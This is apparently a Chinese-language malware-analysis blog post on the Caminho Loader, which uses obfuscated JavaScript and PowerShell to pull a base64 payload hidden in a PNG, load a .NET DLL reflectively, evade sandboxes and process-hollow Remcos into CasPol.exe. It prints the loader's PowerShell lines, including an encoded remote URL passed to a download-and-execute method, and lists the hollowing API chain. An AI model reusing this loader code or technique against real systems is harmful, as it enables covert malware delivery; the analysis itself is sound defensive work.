+++
date = '2025-11-08'

draft = false
title = "分析 Caminho Loader"

tags = ["Malware","Loader"]

categories = ["Analyze"]
+++

Caminho Loader与PhantomVAI Loader相似，被用来分发其他恶意软件，如Kata Stealer, Xworm, Remcos等

采用js脚本创建powershell下载并加载隐写有效载荷的png图片，后续使用Process Hollowing将有效载荷注入进程





## 运行流程图

![473b8e9be02265e25ef12a5a7faa6c4a30184265870ca5bf7869eb223b94c1f3](CaminhoLoader/473b8e9be02265e25ef12a5a7faa6c4a30184265870ca5bf7869eb223b94c1f3.png)



## js运行



样本js代码被大量垃圾代码进行混淆填充

![0f0d735df283278a0678c17ab1f1cf5dd14675b414e03b71d82d9add3cf74431](CaminhoLoader/0f0d735df283278a0678c17ab1f1cf5dd14675b414e03b71d82d9add3cf74431.png)

去除混淆后，创建powershell进程运行代码

![e2b7879d46ed794cf62fb69ea0bff811d266c69c39ff577ea72bea08f25752cf](CaminhoLoader/e2b7879d46ed794cf62fb69ea0bff811d266c69c39ff577ea72bea08f25752cf.png)

this.blackbutt为随机字符填充的一个base64字符串，进行过滤和base64解码后内容为

![a1e26017121918f1d88c236409da810dd783345e0b73e44b700b7da8461ea2eb](CaminhoLoader/a1e26017121918f1d88c236409da810dd783345e0b73e44b700b7da8461ea2eb.png)

## powershell运行

第一次下载，powershell下载保存在archive.org服务器上的图片文件， archive.org是一个非营利性的数字图书馆，主要保存互联网上的各种资源，包括网页、视频、音频，图片等。

![ed0bff646f2f181b933c5053077c8a127b2508873f16897f9d7ef343246e96f9](CaminhoLoader/ed0bff646f2f181b933c5053077c8a127b2508873f16897f9d7ef343246e96f9.png)

该图片中保存了以BaseStart-开头， -BaseEnd结束的base64编码内容

![29317462b425370f190af66aa1b445a16dd7e5a2af35a65a5722169669824817](CaminhoLoader/29317462b425370f190af66aa1b445a16dd7e5a2af35a65a5722169669824817.png)

![e99025462184295f1aad30e741cd778d27de7a2c9188937819be4ea13f02969f](CaminhoLoader/e99025462184295f1aad30e741cd778d27de7a2c9188937819be4ea13f02969f.png)

powershell进行base64解码

```powershell
$revanchists = ($telifera -match 'BaseStart-(.*?)-BaseEnd'); 
$rebrobate = $matches[1]; 
$balladier = [Reflection.Assembly]::Load([Convert]::FromBase64String($rebrobate)); 
$polypectomy = '=QHe05CMzQTNzIzNyATM1IDMy81b2lWdxJXYvEmeu82YuEGcvN2bw9yL6MHc0RHa'; 
```

$polypectomy为反向的base64字符，实际解码后为url

![5802d91ee74467b3ee0fb45340d9ebaba48fd599dd863215465b2f61fff9117b](CaminhoLoader/5802d91ee74467b3ee0fb45340d9ebaba48fd599dd863215465b2f61fff9117b.png)

加载内容到内存中运行，获取VAI方法进行调用，构造调用参数堆栈进行调用

```powershell
$combo = $balladier.GetType('ClassLibrary1.Class1'); 
$prason = $combo.GetMethod('VAI'); 
$prason.Invoke($revanchists,[object[]]@($polypectomy,'','C:\Users\Public\Downloads\','Name_File','CasPol','','CasPol','','URL','C:\Users\Public\Downloads\','Name_File','js','1','','Task_Name','0','','',''));
```

调用参数设置

![817d9497bec3f9205b09b192831cf9fca729312b93579231a3e989d0bf69aecd](CaminhoLoader/817d9497bec3f9205b09b192831cf9fca729312b93579231a3e989d0bf69aecd.png)

## .net运行

base64字符串解码后为.net dll动态库文件

![af5731a5dcc49080efce56624a3944d7cd1f5fb899d1dbeea6a042758a593fe4](CaminhoLoader/af5731a5dcc49080efce56624a3944d7cd1f5fb899d1dbeea6a042758a593fe4.png)

CaminhoLoader添加了大量混淆来对抗分析，比如对类名、函数、方法进行混淆，还有控制流混淆等。

如典型的控制流混淆

![54669c312f397986a9ed0492f7d98693de7ff10e62a670b16f45d8abe9a16f65](CaminhoLoader/54669c312f397986a9ed0492f7d98693de7ff10e62a670b16f45d8abe9a16f65.png)

de4dot进行反混淆

![82972236dd9411d4af29786be0652373e300b8502712a23b22875e9428de7481](CaminhoLoader/82972236dd9411d4af29786be0652373e300b8502712a23b22875e9428de7481.png)

因.net dll需要动态加载才可调试运行，这里手动使用powershell进行反射加载运行，dnspy进行附加调试

反射加载.net文件

```powershell
$balladier = [Reflection.Assembly]::LoadFile("C:\xxxxx\Desktop\test.bin");
```

构造VAI方法调用

```powershell
$polypectomy = "=QHe05CMzQTNzIzNyATM1IDMy81b2lWdxJXYvEmeu82YuEGcvN2bw9yL6MHc0RHa"
$combo = $balladier.gettype("ClassLibrary1.Class1")
$prason = $combo.getmethod("VAI")
$prason.invoke("", [object[]]@($polypectomy, "", "C:\\Users\\Public\\Downloads\\", "Name_File", "CasPol", "", "CasPol", "", "URL", "C:\\Users\\Public\\Downloads\\", "Name_File", "js", "1", "", "Task_Name", "0", "", "", ""))
```

dnspy附加powershell.exe，即可进行调试

![1b2dfc4900ce51d61a96b56cf91d861372b780f81bbe41dfe437b087154d13be](CaminhoLoader/1b2dfc4900ce51d61a96b56cf91d861372b780f81bbe41dfe437b087154d13be.png)

在运行之前将进行反调试，虚拟机检测，进程检测等操作，如下图

![a944b7f1cb0ceccda9fcbfaa97afdb31a98abfadf9d74861b70fcc3fa8fca1b1](CaminhoLoader/a944b7f1cb0ceccda9fcbfaa97afdb31a98abfadf9d74861b70fcc3fa8fca1b1.png)

![fe6be788e36e491ad78c11db4225329d85fdfeed139dae873b1bf0d32fcd3fea](CaminhoLoader/fe6be788e36e491ad78c11db4225329d85fdfeed139dae873b1bf0d32fcd3fea.png)

通过AES解密算法解密资源

![103d2b8c571a4693fc7168dfc0d5e6e8366a359f0bd623bf9a5ee93b48c326ae](CaminhoLoader/103d2b8c571a4693fc7168dfc0d5e6e8366a359f0bd623bf9a5ee93b48c326ae.png)

![d0d1fa5b2c90790e15aff0ac4d4ecc0d252aaf4b3fb370a878a1102e4ccde801](CaminhoLoader/d0d1fa5b2c90790e15aff0ac4d4ecc0d252aaf4b3fb370a878a1102e4ccde801.png)

加载当前进程中的LLcLn资源

![5a640bc06b7f44df81d5518a5515f561c7c642cb9c7b8dc5f902d789581f953c](CaminhoLoader/5a640bc06b7f44df81d5518a5515f561c7c642cb9c7b8dc5f902d789581f953c.png)

该dll资源中内嵌一个被加密的模块，使用AES算法解密LLcLn资源内容为

![d72ce869bad1efede14a5999849e04eb2fece0f521a7c042ff57e8e62e12c4d0](CaminhoLoader/d72ce869bad1efede14a5999849e04eb2fece0f521a7c042ff57e8e62e12c4d0.png)

bWcwiDztFkJF模块作为资源中转站，其中存在两个被AES加密的资源文件，通过获取该模块中的资源进行字符串的解密

FhPXU解密后内容，CaminhoLoader运行时所需的字符串都包含在其中

![b44e0f07c55b35aa84f1827644d57eb1ff0f044ce7f79db0926291275c444a6a](CaminhoLoader/b44e0f07c55b35aa84f1827644d57eb1ff0f044ce7f79db0926291275c444a6a.png)

### 运行时代码构建

动态创建?模块和类型， 并且进行反射调用

![8ab7563e9e5fc2db829106cbe046899fba5f4b652fded047ee3fe062ce1b94fb](CaminhoLoader/8ab7563e9e5fc2db829106cbe046899fba5f4b652fded047ee3fe062ce1b94fb.png)

方法名字符串，在动态创建.net IL代码时会使用

```c#
System.Reflection.Assembly
GetEntryAssembly
get_FullName
op_Inequality
get_Length
GetTypeFromHandle
get_Name
IndexOf
ReadString
Add
get_Position
get_CurrentDomain
SetData
13447
AssemblyServer
SimpleAssemblyExplorer
babelvm
smoketest
```

生成IL代码

![72a569c6e7aa0af07c734d029dfd178f3fed9e7e28f5329a9853cbc5d49d6b4b](CaminhoLoader/72a569c6e7aa0af07c734d029dfd178f3fed9e7e28f5329a9853cbc5d49d6b4b.png)

动态创建的IL代码

```c#
ldc.i4	0x3487
stloc.0
call	class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
stloc.1
ldloc.1
brfalse.s	50 (0068) ldarg.0 
ldloc.1
callvirt	instance string [mscorlib]System.Reflection.Assembly::get_FullName()
stloc.s	V_6 (6)
nop
nop
nop
ldloc.s	V_6 (6)
nop
nop
nop
ldstr	"AssemblyServer"
ldc.i4.5
callvirt	instance int32 [mscorlib]System.String::IndexOf(string, valuetype [mscorlib]System.StringComparison)
ldc.i4.m1
bne.un.s	48 (0066) ldc.i4.0 
ldloc.s	V_6 (6)
nop
nop
nop
ldstr	"SimpleAssemblyExplorer"
ldc.i4.5
callvirt	instance int32 [mscorlib]System.String::IndexOf(string, valuetype [mscorlib]System.StringComparison)
ldc.i4.m1
bne.un.s	48 (0066) ldc.i4.0 
ldloc.s	V_6 (6)
nop
nop
nop
ldstr	"babelvm"
ldc.i4.5
callvirt	instance int32 [mscorlib]System.String::IndexOf(string, valuetype [mscorlib]System.StringComparison)
ldc.i4.m1
bne.un.s	48 (0066) ldc.i4.0 
ldloc.s	V_6 (6)
nop
nop
nop
ldstr	"smoketest"
ldc.i4.5
callvirt	instance int32 [mscorlib]System.String::IndexOf(string, valuetype [mscorlib]System.StringComparison)
ldc.i4.m1
beq.s	50 (0068) ldarg.0 
ldc.i4.0
stloc.0
ldarg.0
callvirt	instance int64 [mscorlib]System.IO.Stream::get_Length()
stloc.2
ldarg.0
newobj	instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream)
stloc.3
newobj	instance void [mscorlib]System.Collections.Hashtable::.ctor()
stloc.s	V_4 (4)
nop
nop
nop
ldloc.3
callvirt	instance string [mscorlib]System.IO.BinaryReader::ReadString()
stloc.s	V_5 (5)
nop
nop
nop
ldloc.s	V_4 (4)
nop
nop
nop
ldc.i4.m1
box	[mscorlib]System.Int32
ldloc.s	V_5 (5)
nop
nop
nop
callvirt	instance void [mscorlib]System.Collections.Hashtable::Add(object, object)
ldloc.0
brfalse.s	100 (00D2) call class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
br.s	96 (00C9) ldarg.0 
ldloc.s	V_4 (4)
nop
nop
nop
ldarg.0
callvirt	instance int64 [mscorlib]System.IO.Stream::get_Position()
conv.i4
ldc.i4	0x50
add
ldloc.0
xor
box	[mscorlib]System.Int32
ldloc.3
callvirt	instance string [mscorlib]System.IO.BinaryReader::ReadString()
callvirt	instance void [mscorlib]System.Collections.Hashtable::Add(object, object)
ldarg.0
callvirt	instance int64 [mscorlib]System.IO.Stream::get_Position()
ldloc.2
blt.s	81 (00A5) ldloc.s V_4 (4)
call	class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
ldloc.s	V_5 (5)
nop
nop
nop
ldloc.s	V_4 (4)
nop
nop
nop
callvirt	instance void [mscorlib]System.AppDomain::SetData(string, object)
ldloc.s	V_5 (5)
nop
nop
nop
ret
```

创建的?模块中实现了对FhPXU解密的字符串进行hashtable保存，该**hashTable**中保存了运行时所需的字符串，可在运行时查表快速获取字符串，如**CreateProcessA**， **VirtualAllocEx**，**SOFTWARE\Microsoft\Windows\CurrentVersion\Run**等

![6bad55fa7e373ced8714df9ce34eaa4d162f92f3d3ba3b4ebfec2aaf4f7e6416](CaminhoLoader/6bad55fa7e373ced8714df9ce34eaa4d162f92f3d3ba3b4ebfec2aaf4f7e6416.png)

通过hashTable获取字符串

![9146dd25009af989789f47cf5d0ecd33cae1f2f4d55a4b1a25b0fd28076e23a7](CaminhoLoader/9146dd25009af989789f47cf5d0ecd33cae1f2f4d55a4b1a25b0fd28076e23a7.png)

**\uEF6A.\uEF2A**检测虚拟机，根据hashtable获取保存的vmname，类似于[VMDetector](https://github.com/robsonfelix/VMDetector)虚拟机检测， 检测是否在沙盒中运行

![3fc6618ccee53883fd7b15f66ad1e9a4f81eb08379fef933b6278f378d39e418](CaminhoLoader/3fc6618ccee53883fd7b15f66ad1e9a4f81eb08379fef933b6278f378d39e418.png)

该dll可根据上面VAI参数设置进行任务计划进行持久化设置，可设置任务计划启动项为Name_File.js，Task_Name为任务名

第二次下载，连接服务器，进行网络连接下载txt文件

![d41db155abad98ad0946d3379a32dd02ad7d38eac194a942a9fff970bded3bec](CaminhoLoader/d41db155abad98ad0946d3379a32dd02ad7d38eac194a942a9fff970bded3bec.png)

该txt文件同样也被base64编码

![f2509e06d6398dad9cb24fa0829669d71b3dbb6b9c220ff697b69d896f760545](CaminhoLoader/f2509e06d6398dad9cb24fa0829669d71b3dbb6b9c220ff697b69d896f760545.png)

解码后为可执行文件

![655f20e8a1e91bfe0e3bfa64acd58fb6d7789c5a82f5cbe37a27ccec39e6f17d](CaminhoLoader/655f20e8a1e91bfe0e3bfa64acd58fb6d7789c5a82f5cbe37a27ccec39e6f17d.png)

### 进程注入

拼接CasPol.exe路径，后续将可执行文件注入到其中。

![c84fd6053edbadc0421ba77f05075f6a760da5ac3684d44faae70b1977e94a4a](CaminhoLoader/c84fd6053edbadc0421ba77f05075f6a760da5ac3684d44faae70b1977e94a4a.png)

动态获取API地址

![b6aa275df3d414dd69fe68f9a918a04b8a530f7a617f8d9da33d2bcd2c47c34d](CaminhoLoader/b6aa275df3d414dd69fe68f9a918a04b8a530f7a617f8d9da33d2bcd2c47c34d.png)

![096b5c2f1dc5c0efa4e95f1a35807c0e367c582d529208624e9c819568d8a724](CaminhoLoader/096b5c2f1dc5c0efa4e95f1a35807c0e367c582d529208624e9c819568d8a724.png)

将解密后的可执行文件反射注入到CasPol.exe进程中运行

![bd873eff666de6da880c501e9db248ff6e9cf8d7a588c97649370766f1954ba3](CaminhoLoader/bd873eff666de6da880c501e9db248ff6e9cf8d7a588c97649370766f1954ba3.png)

.net使用WinAPI， 创建傀儡进程进行程序的注入

> *CreateProcessA ->  ZwUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> GetThreadContext/SetThreadContex -> ResumeThread*

![21c978f916a4c99d400f91612ad6a6011332077a7fe45b504768cedb53ba6726](CaminhoLoader/21c978f916a4c99d400f91612ad6a6011332077a7fe45b504768cedb53ba6726.png)

最终可执行文件为remcos商业木马

![9c3d54dc5f1f48f97633cb743df636ee3effdd5863a8d7d80363bedb40b0f363](CaminhoLoader/9c3d54dc5f1f48f97633cb743df636ee3effdd5863a8d7d80363bedb40b0f363.png)





## IOC

![bbe53961fbfdfaf779bd2da839aac46dcec5321bb2fe34084fa58180328cd822](CaminhoLoader/bbe53961fbfdfaf779bd2da839aac46dcec5321bb2fe34084fa58180328cd822.png)

